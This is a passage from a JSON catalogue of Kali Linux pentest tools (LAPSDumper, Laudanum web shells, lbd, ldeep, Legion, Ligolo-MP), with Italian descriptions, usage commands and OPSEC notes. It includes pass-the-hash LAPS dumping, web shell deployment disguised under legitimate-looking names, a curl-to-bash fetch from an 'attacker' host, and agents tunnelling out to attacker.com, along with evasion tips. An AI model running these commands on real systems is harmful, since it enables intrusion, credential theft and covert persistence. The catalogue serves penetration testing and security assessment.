ms-LAPS-Password (Windows LAPS/LAPS 2.0) da tutti i computer objects accessibili. Restituisce computer name e password in chiaro. Supporta autenticazione con password, hash NTLM, o Kerberos ticket.</p><p><strong>Bulk and Targeted Dump:</strong> Può estrarre password per tutti i computer nel dominio (limitato dai permessi dell'utente) o targetizzare specifici computer/OU. Utile per identificare esattamente dove l'utente compromesso ha accesso admin locale.</p><p><strong>Windows LAPS Support:</strong> Windows LAPS (la versione moderna) usa un formato diverso e può anche criptare le password. LAPSDumper supporta entrambi i formati e può decifrare password Windows LAPS se le credenziali hanno i permessi appropriati.</p><p><strong>Permission Verification:</strong> Identifica quali computer hanno LAPS configurato e per quali l'utente corrente può leggere la password. Questo aiuta a mappare l'accesso effettivo anche se non si ottengono tutte le password.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === BASIC LAPS DUMP ===\n# Dump tutte le password LAPS accessibili\nlapsdumper -u user -p password -d domain.com\n\n# Specificare Domain Controller\nlapsdumper -u user -p password -d domain.com -l dc.domain.com\n\n# === AUTENTICAZIONE ===\n# Con hash NTLM (pass-the-hash)\nlapsdumper -u user -H NTHASH:NTHASH -d domain.com\n\n# Con Kerberos (ticket già in cache)\nexport KRB5CCNAME=/tmp/user.ccache\nlapsdumper -k -d domain.com\n\n# === QUERY SPECIFICHE ===\n# Computer specifico\nlapsdumper -u user -p pass -d domain.com -c WORKSTATION01\n\n# Tutti i computer che iniziano con 'SRV'\nlapsdumper -u user -p pass -d domain.com -c 'SRV*'\n\n# Computer in OU specifica\nlapsdumper -u user -p pass -d domain.com -o 'OU=Servers,DC=domain,DC=com'\n\n# === ALTERNATIVE CON LDAPSEARCH ===\n# Query manuale con ldapsearch\nldapsearch -x -H ldap://dc.domain.com -D 'user@domain.com' -w 'password' \\\n  -b 'DC=domain,DC=com' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd\n\n# === CON IMPACKET ===\n# Get-LAPSPassword.py\nGet-LAPSPassword.py domain.com/user:password -dc-ip DC_IP\n\n# === POST-EXPLOITATION ===\n# Usa password estratta per accesso locale\nsmbexec.py domain.com/Administrator:'LAPSPassword123'@workstation\n\n# O crackmapexec per accesso massivo\ncrackmapexec smb targets.txt -u Administrator -p 'LAPSPassword123' --local-auth\n\n# Attenzione: LAPS genera password diverse per ogni computer!\n# Ogni accesso richiede la password specifica di quel computer</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation Locale</strong>, se l'utente compromesso ha permessi di lettura LAPS (spesso per errore o inheritance), puoi ottenere accesso admin locale a workstation e server. Questo è particolarmente utile quando l'utente normale non ha altri privilegi elevati.</p><p>Durante <strong>Lateral Movement</strong>, a differenza di password admin condivise, LAPS genera password uniche per ogni computer. Devi leggere la password specifica per ogni target. Questo rende il movimento laterale più metodico ma anche più tracciabile.</p><p>Nel <strong>Active Directory Security Assessment</strong>, verificare chi può leggere password LAPS è critico. Spesso i permessi sono configurati su OU ma ereditati da utenti o gruppi che non dovrebbero averli. LAPSDumper rivela l'impatto reale di queste misconfigurazioni.</p><p>Per <strong>Post-Compromise Recovery Testing</strong>, dopo un breach, verificare se l'attaccante poteva accedere a password LAPS aiuta a determinare il blast radius. Se poteva leggere LAPS, potenzialmente aveva admin locale su tutti quei sistemi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Query Logging:</strong> Le query LDAP verso attributi LAPS possono essere loggate, specialmente in ambienti con auditing avanzato. Microsoft consiglia di monitorare accessi a ms-Mcs-AdmPwd. Query massive per tutti i computer sono sospette.</p><p><strong>Permission Requirements:</strong> Leggere LAPS richiede permessi specifici (ReadProperty su ms-Mcs-AdmPwd). Non tutti gli utenti possono farlo. Un tentativo di lettura senza permessi genera errore ma l'accesso può comunque essere loggato.</p><p><strong>Windows LAPS Encryption:</strong> Windows LAPS può criptare le password in AD. In questo caso, anche leggendo l'attributo serve la chiave per decifrare. I permessi di decryption sono separati dalla lettura.</p><p><strong>Credential Exposure:</strong> Usare le password LAPS estratte genera eventi di login sui target. Ogni uso di una password LAPS è tracciabile nei Security logs del computer target come login Administrator locale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "laudanum",
    "name": "laudanum",
    "version": "1.0",
    "icon": "../app/icons/laudanum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/laudanum/",
    "desc": "Collezione di web shell in ASP, ASPX, JSP, PHP per vari scenari di post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Laudanum</strong> è una collezione storica e completa di web shell pronte all'uso per ogni major web technology stack: PHP, ASP/ASPX (IIS), JSP (Java), CFM (ColdFusion). Ogni linguaggio include multiple varianti di shell con diverse funzionalità: command execution semplice, file browser con upload/download, reverse shell, proxy per tunneling, e shell con autenticazione. Le shell sono progettate per essere relativamente compatte (facilitando upload via form con size limit), funzionali (features complete per post-exploitation), e facili da customizzare (parametri configurabili per IP, porta, password). Inclusa in Kali Linux come pacchetto pronto all'uso, Laudanum è un toolkit essenziale per qualsiasi penetration tester che lavora con vulnerabilità di file upload o accesso in scrittura a web server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language Coverage:</strong> Shell complete per PHP (il più comune), ASP Classic e ASPX (.NET), JSP (Java application server), e CFM (ColdFusion). Qualunque sia il technology stack del target, Laudanum ha una shell appropriata pronta.</p><p><strong>Variety of Shell Types:</strong> Per ogni linguaggio include: cmd shell (semplice esecuzione comandi), file browser (navigazione filesystem con upload/download), reverse shell (connessione outbound all'attacker), proxy (per tunneling traffico attraverso il server), DNS shell (comandi via query DNS). Scegli il tipo appropriato per lo scenario.</p><p><strong>Authentication Option:</strong> Alcune shell includono meccanismo di autenticazione (password o IP whitelist) per evitare che altri attaccanti o crawler le scoprano e usino. Critico per operazioni che durano nel tempo.</p><p><strong>Compact Design:</strong> Le shell sono ottimizzate per dimensioni ridotte pur mantenendo funzionalità. Importante quando i form di upload hanno limit sulla dimensione dei file o quando si devono evitare detection basate su file size anomali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === LOCATION IN KALI ===\nls -la /usr/share/laudanum/\n# Sottodirectory per linguaggio:\n# /usr/share/laudanum/php/\n# /usr/share/laudanum/aspx/\n# /usr/share/laudanum/asp/\n# /usr/share/laudanum/jsp/\n# /usr/share/laudanum/cfm/\n\n# === PHP SHELLS ===\n# Command shell semplice\ncp /usr/share/laudanum/php/shell.php .\n# Dopo upload: http://target/uploads/shell.php?cmd=id\n\n# File browser PHP\ncp /usr/share/laudanum/php/file.php .\n# Interfaccia grafica per file browsing\n\n# Reverse shell PHP\ncp /usr/share/laudanum/php/php-reverse-shell.php .\n# Modifica $ip e $port nel file\nnano php-reverse-shell.php\n# Avvia listener e triggera\nnc -lvnp 4444\n\n# === ASPX SHELLS (.NET/IIS) ===\n# Command shell ASPX\ncp /usr/share/laudanum/aspx/shell.aspx .\n# http://target/shell.aspx?cmd=whoami\n\n# File browser ASPX\ncp /usr/share/laudanum/aspx/file.aspx .\n\n# === JSP SHELLS (Java) ===\n# Command shell JSP\ncp /usr/share/laudanum/jsp/cmd.jsp .\n# http://target/cmd.jsp?cmd=id\n\n# Reverse shell JSP\ncp /usr/share/laudanum/jsp/reverseshell.jsp .\n# Modifica ATTACKER_IP e PORT\n\n# === ASP CLASSIC (Legacy IIS) ===\n# Command shell ASP\ncp /usr/share/laudanum/asp/cmd.asp .\n\n# === CUSTOMIZATION ===\n# Rinomina per sembrare legittimo\ncp shell.php admin_config.php\ncp shell.aspx settings.aspx\n\n# Aggiungi autenticazione (per shell che la supportano)\n# Modifica variabile $password nel file\n\n# === POST-EXPLOITATION ===\n# Dopo aver ottenuto shell, uploada tool aggiuntivi\ncurl http://attacker/linpeas.sh > /tmp/lp.sh && bash /tmp/lp.sh\n\n# Pivot verso rete interna\n# Usa proxy shell per tunneling</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>File Upload Exploitation</strong>, quando si scopre una vulnerabilità di file upload che permette di caricare file eseguibili, Laudanum fornisce shell immediatamente pronte per ogni technology stack senza dover scrivere codice custom.</p><p>Per <strong>Web Application Penetration Testing</strong>, dopo aver ottenuto write access a un web server (via vulnerabilità, credenziali, o misconfigurazione), le shell Laudanum stabiliscono rapidamente una presenza persistente.</p><p>Nel <strong>Pivoting Through Web Server</strong>, il server web compromesso diventa punto di pivot per accedere alla rete interna. Le proxy shell permettono di tunnelare traffico, mentre le command shell esplorano la rete circostante.</p><p>Durante <strong>Capture The Flag (CTF)</strong>, avere shell pronte per ogni linguaggio accelera significativamente il tempo di exploitation quando si trova una vulnerability di file upload.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AV/EDR Detection:</strong> Le shell Laudanum sono note e i loro hash/pattern sono nei database di molti antivirus. Windows Defender, ClamAV, e WAF con signature possono bloccarle. Considerare modifica del codice o obfuscation per evadere detection.</p><p><strong>Persistent Disk Artifact:</strong> A differenza di shell in-memory, le web shell restano su disco come file. Scansioni di file integrity, antivirus periodici, o review manuale le troveranno. Rimuovere dopo uso o usare nomi che sembrano legittimi.</p><p><strong>Access Log Footprint:</strong> Ogni accesso alla shell appare nei log del web server (access.log). I parametri GET con comandi sono particolarmente visibili. Preferire POST requests dove possibile per ridurre visibilità nei log.</p><p><strong>Web Application Firewall:</strong> WAF moderni hanno regole per rilevare pattern di web shell: eval(), base64_decode(), exec(), system() nei file uploadati o nelle request. Potrebbero essere necessarie tecniche di evasion.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lbd",
    "name": "lbd",
    "version": "0.4",
    "icon": "../app/icons/lbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lbd/",
    "desc": "Rileva load balancer e WAF analizzando differenze nelle risposte HTTP multiple.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LBD</strong> (Load Balancing Detector) è uno strumento di reconnaissance progettato per identificare la presenza di load balancer, reverse proxy e WAF nell'infrastruttura web di un target. Effettuando richieste HTTP multiple e analizzando le sottili differenze nelle risposte (header, timestamp, cookie, server signature), determina se il traffico viene distribuito tra più backend server. Questa informazione è fondamentale per pianificare attacchi che richiedono persistenza su un singolo server o per identificare punti deboli nell'architettura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DNS-Based Detection:</strong> Risolve il dominio multiple volte per identificare se esistono più record A che puntano a IP diversi (DNS round-robin), la forma più semplice di load balancing.</p><p><strong>HTTP Header Analysis:</strong> Confronta header come Server, X-Powered-By, Date, e header custom tra risposte successive. Variazioni indicano backend server diversi o load balancer che modificano le risposte.</p><p><strong>Server Fingerprinting:</strong> Identifica differenze nelle signature dei web server (Apache vs nginx, versioni diverse) che rivelano un pool di backend eterogeneo dietro il load balancer.</p><p><strong>Cookie & Session Analysis:</strong> Analizza i cookie di sessione e gli identificatori di backend (come JSESSIONID, PHPSESSID, o cookie sticky session) che molti load balancer inseriscono per mantenere l'affinità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>LBD è uno script bash semplice che richiede solo il dominio target come parametro.</p><pre><code># Detection standard\nlbd target.com\n\n# Output tipico:\n# Checking for DNS-Load-Balancing: NOT FOUND\n# Checking for HTTP-Load-Balancing [Server]: \n#   Apache/2.4.41 (Ubuntu)\n#   Apache/2.4.41 (Ubuntu)\n# NOT FOUND\n#\n# Checking for HTTP-Load-Balancing [Date]: 11:25:34, 11:25:35\n# FOUND\n#\n# target.com does Load-balancing. Found via Methods: HTTP[Date]\n\n# Per risultati più affidabili, eseguire più volte\nfor i in {1..5}; do lbd target.com; sleep 2; done</code></pre><p>L'output indica chiaramente quale metodo di detection ha identificato il load balancing e fornisce dettagli sui server backend quando possibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Reconnaissance</strong>, LBD rivela la complessità dell'infrastruttura target. Sapere che esistono multiple istanze backend influenza la strategia di attacco e le aspettative sui risultati.</p><p>Per <strong>Session Hijacking</strong> e attacchi che richiedono persistenza, è essenziale sapere se le richieste potrebbero finire su server diversi, invalidando token o session state.</p><p>Nel <strong>WAF Bypass Planning</strong>, identificare un load balancer può rivelare opportunità: alcuni backend potrebbero avere configurazioni WAF diverse o più permissive.</p><p>Per <strong>Vulnerability Assessment</strong>, se i backend server hanno versioni software diverse, potrebbero avere vulnerabilità diverse - testare uno non garantisce la sicurezza di tutti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LBD genera solo traffico HTTP standard indistinguibile da navigazione normale. Non invia payload sospetti, non esegue fuzzing, non tenta exploit. Il pattern di richieste ripetute potrebbe essere notato solo da sistemi di analisi comportamentale molto sofisticati.</p><p><strong>Impatto:</strong> Nullo. Le richieste sono leggere e non causano carico significativo sul target.</p><p><strong>Limitazioni:</strong> Load balancer sofisticati possono mascherare completamente la loro presenza normalizzando tutti gli header delle risposte. La detection non è garantita al 100% in ambienti enterprise con configurazioni avanzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "ldeep",
    "name": "ldeep",
    "version": "1.0.87",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ldeep/",
    "desc": "Tool LDAP per enumerazione AD: utenti, gruppi, GPO, trust, delegation e ACL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LDeep</strong> è uno strumento Python avanzato per l'enumerazione LDAP di Active Directory, progettato per estrarre sistematicamente informazioni utili per penetration testing e security assessment. A differenza di tool generici LDAP, LDeep conosce la struttura AD e sa esattamente quali attributi e oggetti sono interessanti per un attacker: utenti con descrizioni contenenti password, account con delegation configurata, gruppi privilegiati e loro membri, relazioni di trust, GPO, e ACL permissive. Supporta autenticazione con password, hash NTLM, e ticket Kerberos. Una feature distintiva è la modalità 'cache': può salvare tutti i risultati LDAP in JSON e poi analizzarli offline, permettendo di raccogliere dati velocemente dal target e analizzarli senza ulteriori connessioni. Include anche capacità di esportazione in formati utili per BloodHound e altri tool di analisi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive User Enumeration:</strong> Estrae tutti gli attributi utili degli utenti: descrizione (spesso contiene password hint), ultimo logon, password age, account status (disabled, locked), memberOf per tutti i gruppi. Identifica account con password never expires, accounts non usati da tempo, e admin accounts.</p><p><strong>Privileged Groups Analysis:</strong> Enumera membri di gruppi privilegiati: Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators, e altri gruppi che conferiscono accesso elevato. Include nested membership per vedere l'effective access.</p><p><strong>Delegation Detection:</strong> Trova account con delegation configurata: Unconstrained Delegation (qualsiasi servizio può essere impersonato), Constrained Delegation (solo verso servizi specifici), Resource-Based Constrained Delegation. Questi sono target primari per privilege escalation.</p><p><strong>Trust Relationship Mapping:</strong> Enumera trust con altri domini e forest, identificando la direzione del trust e tipo. Trust esterni e forest trust sono interessanti per cross-domain attacks.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Con password\nldeep ldap -u user -p password -d domain.com -s dc.domain.com [command]\n\n# Con hash NTLM\nldeep ldap -u user -H NTHASH -d domain.com -s dc.domain.com [command]\n\n# Con Kerberos ticket\nKRB5CCNAME=/tmp/ticket.ccache ldeep ldap -k -d domain.com -s dc.domain.com [command]\n\n# === USER ENUMERATION ===\n# Tutti gli utenti\nldeep ldap -u user -p pass -d domain.com -s dc users\n\n# Utenti con dettagli (descrizione, ultimo logon)\nldeep ldap -u user -p pass -d domain.com -s dc users -v\n\n# Utenti con password in descrizione (cerca pattern)\nldeep ldap -u user -p pass -d domain.com -s dc users | grep -i 'pass\\|pwd\\|password'\n\n# === GROUP ENUMERATION ===\n# Tutti i gruppi\nldeep ldap -u user -p pass -d domain.com -s dc groups\n\n# Membri di gruppo specifico\nldeep ldap -u user -p pass -d domain.com -s dc membersof \"Domain Admins\"\n\n# Gruppi di un utente\nldeep ldap -u user -p pass -d domain.com -s dc memberships \"targetuser\"\n\n# === DELEGATION ===\n# Account con unconstrained delegation\nldeep ldap -u user -p pass -d domain.com -s dc trustedfordelegation\n\n# Account con constrained delegation\nldeep ldap -u user -p pass -d domain.com -s dc constraineddelegation\n\n# === COMPUTER ENUMERATION ===\n# Tutti i computer\nldeep ldap -u user -p pass -d domain.com -s dc computers\n\n# Computer con LAPS\nldeep ldap -u user -p pass -d domain.com -s dc laps\n\n# === TRUST & GPO ===\n# Trust relationships\nldeep ldap -u user -p pass -d domain.com -s dc trusts\n\n# Group Policy Objects\nldeep ldap -u user -p pass -d domain.com -s dc gpo\n\n# === CACHE MODE (offline analysis) ===\n# Dump tutto in cache\nldeep ldap -u user -p pass -d domain.com -s dc all > dump.json\n\n# Analizza offline\nldeep cache -d domain.com -f dump.json users\nldeep cache -d domain.com -f dump.json membersof \"Domain Admins\"\n\n# === BLOODHOUND INTEGRATION ===\n# Export per BloodHound\nldeep ldap -u user -p pass -d domain.com -s dc bloodhound -o ./bloodhound</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial AD Reconnaissance</strong>, LDeep è uno dei primi tool da usare dopo aver ottenuto credenziali AD valide. Fornisce una mappa completa dell'ambiente: chi sono gli admin, quali trust esistono, dove sono le misconfigurazioni di delegation.</p><p>Durante <strong>Privilege Escalation Path Finding</strong>, le informazioni su delegation e group membership rivelano percorsi di escalation. Account con Unconstrained Delegation sono high-value target. Utenti in gruppi privilegiati meno noti possono avere accesso inaspettato.</p><p>Per <strong>Active Directory Security Assessment</strong>, LDeep aiuta a identificare misconfigurazioni comuni: descrizioni utente con password, account con delegation eccessiva, trust insicuri, GPO abusabili. Il report risultante documenta i rischi per remediation.</p><p>Nel <strong>Offline Analysis</strong>, la cache mode permette di raccogliere dati rapidamente (minimizzando tempo sulla rete) e analizzarli con calma offline. Utile quando la connessione al DC è lenta o limitata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Traffic:</strong> LDeep genera query LDAP standard indistinguibili da tool amministrativi legittimi (PowerShell AD module, AD Users & Computers). Tuttavia, query per tutti gli utenti o tutti i computer generano traffico maggiore di uso normale.</p><p><strong>Event Logging:</strong> Se il DC ha audit LDAP abilitato, le query vengono loggate con l'utente che le esegue. Query massive (tutti gli utenti, tutti i gruppi) possono essere notate in ambienti con monitoring LDAP.</p><p><strong>Account Sensitivity:</strong> Usare un account con i minimi privilegi necessari. Anche un utente normale può fare la maggior parte delle query. Evitare di usare account admin per reconnaissance quando possibile.</p><p><strong>Rate Limiting:</strong> Alcuni DC implementano rate limiting su LDAP query. Query molto grandi potrebbero essere rallentate o bloccate. La cache mode permette di fare una query grande una volta e analizzare offline.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "legion",
    "name": "legion",
    "version": "0.4.3",
    "icon": "../app/icons/legion-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/legion/",
    "desc": "Framework GUI per penetration testing con automazione scanning e integrazione tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Legion</strong> è un framework GUI open-source per penetration testing che automatizza e orchestra la fase di reconnaissance e vulnerability assessment. Fork del progetto Sparta, Legion modernizza l'interfaccia e aggiunge nuove funzionalità mantenendo il concetto centrale: un'unica dashboard che integra decine di tool di security (Nmap, Nikto, Hydra, dirbuster, enum4linux, snmpwalk, etc.), lanciandoli automaticamente in base ai servizi scoperti sui target. I risultati vengono aggregati in un database SQLite che permette di tracciare lo stato dell'assessment, evitare scan duplicati, e generare report. Ideale per pentester che preferiscono un'interfaccia grafica unificata piuttosto che gestire manualmente decine di terminali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Auto-Scanning:</strong> Dopo un Nmap iniziale, Legion analizza i servizi scoperti e suggerisce/lancia automaticamente tool appropriati: Nikto per web server, enum4linux per SMB, snmpwalk per SNMP, Hydra per servizi autenticati. Riduce drasticamente il lavoro manuale di correlazione servizio-tool.</p><p><strong>Tool Integration Hub:</strong> Integra nativamente: Nmap (con script NSE), Nikto, dirbuster/gobuster, Hydra, enum4linux, snmpwalk, smbclient, fierce, whatweb, wafw00f, screenshot tool. Ogni tool viene configurato automaticamente con parametri appropriati per il target.</p><p><strong>Persistent Database:</strong> Tutti i risultati vengono salvati in database SQLite. Permette di riprendere assessment interrotti, evitare scan già eseguiti, cercare attraverso risultati storici, e mantenere audit trail completo dell'attività.</p><p><strong>Collaborative Features:</strong> Il database può essere condiviso tra membri del team. Più pentester possono lavorare sullo stesso assessment vedendo risultati degli altri. Notes e tagging per organizzare findings.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Legion è primariamente GUI-driven, ma può essere automatizzato via script.</p><pre><code># Avvio interfaccia grafica\nlegion\n# o\nsudo legion  # se richiede privilegi per raw socket\n\n# Workflow tipico da GUI:\n# 1. Click \"New Host(s)\" nella toolbar\n# 2. Inserisci target: IP singolo, range CIDR, o hostname\n# 3. Legion lancia automaticamente Nmap con -sV -O\n# 4. Nella tab \"Services\", visualizza servizi scoperti\n# 5. Click destro su servizio -> Run tool (Nikto, Hydra, etc.)\n# 6. Oppure: Toggle auto-attack per lancio automatico\n# 7. Tab \"Scripts\" per NSE targeting specifico\n# 8. Tab \"Brute\" per credential attacks centralizzati\n# 9. Tab \"Notes\" per annotare findings\n# 10. File -> Export per generare report\n\n# Database location (per backup/sharing)\n# ~/.legion/legion.db\n\n# Import host da file\n# Hosts -> Import -> seleziona file con lista IP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Network Penetration Testing</strong>, Legion accelera drasticamente la fase di reconnaissance. Un singolo click avvia la cascata di scan che manualmente richiederebbe di lanciare e monitorare decine di tool separati.</p><p>Per <strong>Junior Pentesters</strong>, Legion guida attraverso la metodologia suggerendo quali tool usare per ogni servizio. La correlazione automatica servizio-tool incorpora best practice del settore.</p><p>In <strong>Team Assessments</strong>, il database condiviso evita duplicazione di lavoro. Un membro può scansionare subnet mentre un altro analizza i risultati, con visibilità reciproca in tempo reale.</p><p>Per <strong>Documentation e Reporting</strong>, Legion mantiene log completo di ogni scan eseguito con timestamp, facilitando la creazione di report di penetration test con cronologia accurata delle attività.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Noise Profile:</strong> Legion lancia molti scan in parallelo generando traffico significativo. Pattern di reconnaissance evidente: port scan seguito immediatamente da vulnerability scanning su porte aperte. Non adatto per operazioni stealth.</p><p><strong>Tool Signatures:</strong> Ogni tool integrato ha la propria signature riconoscibile. Nikto, dirbuster, Nmap default scans sono trivialmente identificabili da WAF e IDS. Considerare customizzazione delle opzioni per assessment dove la detection è un problema.</p><p><strong>Resource Usage:</strong> Scan multipli simultanei consumano banda e risorse. Su target numerosi, può saturare la rete o causare rate limiting. Configurare parallelismo nelle opzioni.</p><p><strong>Authorization:</strong> Dato il volume di scan generato, usare ESCLUSIVAMENTE su target autorizzati in contesti di penetration testing formale con permesso scritto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "ligolo-mp",
    "name": "ligolo-mp",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-mp/",
    "desc": "Ligolo multiplatform con agent per Windows, Linux e macOS per pivoting avanzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-MP</strong> (Ligolo Multiplatform) è un tool avanzato per tunneling e pivoting attraverso reti segmentate, estendendo le capacità di Ligolo originale con supporto multipiattaforma. Fornisce agent precompilati per Windows, Linux e macOS, permettendo di stabilire tunnel criptati TLS verso qualsiasi sistema operativo compromesso. A differenza di SOCKS proxy tradizionali, Ligolo-MP crea un'interfaccia TUN virtuale sull'attacker machine, permettendo routing diretto del traffico verso la rete interna - questo significa che qualsiasi tool può essere usato normalmente senza bisogno di configurare proxy. Il design è ottimizzato per penetration testing: agent leggeri, comunicazioni criptate, e setup rapido. È la soluzione ideale quando si deve accedere a reti segregate attraverso un host compromesso che può raggiungere entrambi i segmenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUN Interface Approach:</strong> Invece di creare un SOCKS proxy, Ligolo-MP crea un'interfaccia TUN virtuale sull'attacker. Il traffico verso la rete target viene automaticamente routato attraverso il tunnel senza necessità di proxychains o configurazioni per-tool. Qualsiasi applicazione funziona trasparentemente.</p><p><strong>Multiplatform Agent:</strong> Agent disponibili per Windows (x86/x64), Linux (x86/x64/ARM), e macOS (x64/ARM). I binari sono statici e non richiedono dipendenze, funzionando su sistemi minimal o container senza librerie installate.</p><p><strong>TLS Encrypted Tunnel:</strong> Tutte le comunicazioni tra agent e proxy sono criptate con TLS. Supporta certificati self-signed per setup rapido o certificati validi per operazioni che richiedono traffico meno sospetto. Anche il contenuto del tunnel è opaco a ispezione.</p><p><strong>Port Forwarding e Listeners:</strong> Oltre al tunneling completo, supporta port forwarding per casi specifici e listener per reverse connections da sistemi nella rete target che non possono raggiungere direttamente l'attacker.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP PROXY (Attacker Machine) ===\n# Avvia proxy con certificato self-signed\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n\n# Con certificato custom\nligolo-proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:11601\n\n# === DEPLOY AGENT (Target) ===\n# Transfer agent appropriato al target\n# Windows\nagent.exe -connect attacker.com:11601 -ignore-cert\n\n# Linux\nchmod +x agent && ./agent -connect attacker.com:11601 -ignore-cert\n\n# Con retry automatico\n./agent -connect attacker.com:11601 -ignore-cert -retry\n\n# === GESTIONE SESSIONI (Nel Proxy) ===\n# Lista agent connessi\nligolo >> session\n\n# Seleziona agent\nligolo >> session\n[Agent: victim.internal] >> \n\n# Visualizza interfacce del target\n[Agent] >> ifconfig\n\n# === CONFIGURA TUNNEL ===\n# Aggiungi route verso rete interna\n# Prima, crea interfaccia TUN sull'attacker\nsudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\n\n# Aggiungi route verso rete target\nsudo ip route add 10.10.10.0/24 dev ligolo\n\n# Avvia tunnel per questo agent\n[Agent] >> start\n\n# === ORA PUOI ACCEDERE ALLA RETE INTERNA ===\n# Tutti i tool funzionano normalmente!\nnmap -sV 10.10.10.0/24\nsssh user@10.10.10.50\ncurl http://10.10.10.100/api\nsmbclient //10.10.10.30/share\n\n# === PORT FORWARDING ===\n# Forward porta locale verso target interno\n[Agent] >> listener_add --addr 0.0.0.0:8080 --to 10.10.10.100:80\n\n# Ora localhost:8080 raggiunge 10.10.10.100:80\n\n# === DOUBLE PIVOT ===\n# Da primo pivot, deploya secondo agent\n# Il secondo agent si connette al primo che forwarda al proxy\n[Agent] >> listener_add --addr 0.0.0.0:11601 --to ATTACKER:11601\n# Deploy agent sul secondo target che si connette al primo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Penetration Testing</strong>, quando il target interno non è raggiungibile direttamente, Ligolo-MP permette di usare tutti i tool di assessment (Nmap, Metasploit, scripts custom) verso la rete interna come se si fosse connessi localmente. Non serve configurare ogni tool per usare proxy.</p><p>Durante <strong>Red Team Operations</strong>, Ligolo-MP è essenziale per muoversi attraverso reti segmentate. Dopo aver compromesso un host nel perimetro o DMZ, il tunnel dà accesso alle reti interne. Il supporto multiplatform permette pivoting indipendentemente dal SO compromesso.</p><p>Per <strong>Post-Exploitation Access</strong>, una volta stabilito il tunnel, si ha accesso completo alla rete interna per ulteriore exploitation, credential harvesting, e lateral movement. La persistenza dell'agent garantisce accesso continuo.</p><p>Nel <strong>Multi-Hop Pivoting</strong>, Ligolo-MP supporta chaining di tunnel attraverso multiple pivot point, permettendo di raggiungere reti molto segregate attraverso una catena di host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Agent Binary:</strong> L'agent è un binario su disco del sistema compromesso. Può essere rilevato da AV/EDR. I binari precompilati hanno hash noti. Per operazioni avanzate, compilare custom agent con modifiche.</p><p><strong>Outbound Connection:</strong> L'agent stabilisce una connessione outbound TLS verso l'attacker. Firewall egress possono bloccarla. Usare porta 443 e certificato valido per mascherare come HTTPS normale. Il traffic pattern può comunque essere identificato.</p><p><strong>Process Visibility:</strong> Il processo agent è visibile nella lista processi. Nomi come 'agent.exe' sono sospetti. Rinominare in qualcosa di plausibile. Su sistemi Linux, potrebbe essere visibile in /proc.</p><p><strong>Traffic Analysis:</strong> Anche con TLS, il pattern di traffico (connessione persistente, volume elevato durante scan) può essere identificato. Considerare throttling del traffico e timing per operazioni covert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-common-binaries",
    "name": "ligolo-ng-common-binaries",
    "version": "0.8.2",
